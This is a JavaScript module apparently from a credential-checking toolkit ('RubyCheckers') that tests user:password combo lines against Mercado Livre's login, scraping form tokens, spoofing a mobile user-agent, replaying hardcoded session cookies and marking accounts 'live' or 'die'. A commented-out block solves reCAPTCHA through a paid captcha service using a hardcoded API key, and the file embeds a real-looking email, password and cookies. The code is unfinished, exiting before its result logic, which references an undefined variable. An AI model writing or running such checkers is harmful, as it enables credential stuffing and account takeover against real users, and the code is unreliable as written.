const cheerio = require('cheerio');
const conf = require('../../../utils/checkers');
const RequesT = conf.req;
const Agent = conf.useragent;
const Sleep = conf.sleep;


async function checker(test){

    console.log('checker ML')

	Sleep(0.1);
	   
		if(test != ''){
            line = test.replace('|',':')
            line = line.split(':')
			if (line.length != 2) {
				return {success: false, status: 'erro', test: {user: test, password: ''}}
			}
            user = line[0].replace(/\r/g,'')
            password = line[1].replace(/\r/g,'')
			
		}else{
			return {success: false, test: {user: '', password: ''}}
		}

        var twocapKey = '9e33605e375054c3ca9275eea9c95b8d'
        var siteKey = '6LclMQQTAAAAALNVRzSHnJXOmljlDoxGGsHEloCU'
        var siteUrl = 'https://www.mercadolivre.com'

        /*

        while (true) {

            try {

                console.log('Enviando req recap\n')

                var capId = await RequesT(
                    'post',
                    `http://2captcha.com/in.php?key=${twocapKey}&method=userrecaptcha&googlekey=${siteKey}&pageurl=${siteUrl}`
                )

                capId = String(capId.response.data).split('|')[1]
                console.log(capId)

                break

            } catch (err) {
                console.log(err)
            }

        }

        while (true) {
            try{

                var recaptcha_response = await RequesT(
                    'get',
                    `http://2captcha.com/res.php?key=${twocapKey}&action=get&id=${capId}`
                )

                break

            } catch(err) {
                console.log(err)
            }
        }

        while (true) {
            try {

                recaptcha_response = await RequesT(
                    'get',
                    `http://2captcha.com/res.php?key=${twocapKey}&action=get&id=${capId}`
                )

                console.log(String(recaptcha_response.response.data))

                if (String(recaptcha_response.response.data).includes('CAPCHA_NOT_READY')) {
                    continue
                } else {
                    var gctkn = String(recaptcha_response.response.data).split('|')[1]
                    console.log('recap response: ')
                    console.log(gctkn)
                    break
                }

            }catch(err){
                console.log(err)
            }
        }
        try {
            const UserAgent = await Agent()
        } catch (err) {
            console.log(err)
        }

        */

        while (true) {

            try {

                console.log('primeira req: \n')

                const req1 = await RequesT(
                    'get',
                    'https://www.mercadolivre.com/jms/mlb/lgz/msl/login/',{
                        'Host': 'www.mercadolivre.com'
                    }
                    );
        
                var $ = cheerio.load(String(req1.response.data))
        
                var dps = $('#dps')
                dps = dps['0'].attribs.value
        
                var action = $('.login-form')
                action = action['0'].attribs.action
                break
    
                } catch(err) {
                    console.log(err)
                    continue
                }

        }

        Sleep(2)
        
        while (true) {

            try {

                const req2 = await RequesT('post', 'https://www.mercadolivre.com'+ action, {
                    'Host': 'www.mercadolivre.com',
                    'Origin': 'https://www.mercadolivre.com',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; SM-G935F Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36',
                    'Content-Type': 'application/json;charset=UTF-8',
                    'Accept': 'application/json',
                    'ContentType': 'application/json',
                    'Referer': 'https://www.mercadolivre.com' + action,
                    'Cookie': 'msl_tx=4I8Zft1E70YkaUZPlIbYbcIXIeHaMhHj; _ml_dc=1; _ml_ga=GA1.2-3.1215850080.1616471636; _ml_ga_gid=GA1.2-3.1478695176.1616471636; _d2id=0c702d71-07ec-4732-a268-ed1f0df52c62-n; ftid=TTHX27OqlP4iAmWWez8YcoAs6BRD4MYk-1616471618308'
                },
                {
                    'user_id': 'marcelobezerra22361056@gmail.com',
                    "dps": dps,
                    "kstrs":"",
                    "type":"email_or_nickname_or_phone",
                    "gctkn": 'script-loaded'
                }
                )

                var action2 = req2.response.request._redirectable._options.path
                break

            } catch (err) {

                console.log(err)

            }

        }

        Sleep(2)

        while (true) {

            try {

                const req3 = await RequesT('post', 'https://www.mercadolivre.com'+ action2, {
                    'Host': 'www.mercadolivre.com',
                    'Origin': 'https://www.mercadolivre.com',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; SM-G935F Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Referer': 'https://www.mercadolivre.com' + action2,
                    'Cookie': 'msl_tx=4I8Zft1E70YkaUZPlIbYbcIXIeHaMhHj; _ml_ga=GA1.2-3.1215850080.1616471636; _ml_ga_gid=GA1.2-3.1478695176.1616471636; _d2id=0c702d71-07ec-4732-a268-ed1f0df52c62-n; ftid=TTHX27OqlP4iAmWWez8YcoAs6BRD4MYk-1616471618308',
                },
                `user_id=marcelobezerra22361056@gmail.com&password=1234567890&action=complete&dps=${dps}&gctkn=script-loaded&kstrs=&type=enter_password`
                )

                console.log(req3)
                break

            } catch (err) {

                console.log(err)

            }

        }

        process.exit()
            

			if (login.response.data.isSuccess ==  true){

				return {success:true, status: 'live', test: {user: user, password: password}, info: ' >> by RubyCheckers'}

			}else if ( login.response.data.isSuccess == false){
				return {success:false, status: 'die', test: {user: user, password: password}}
			}
            
		
}


module.exports = checker;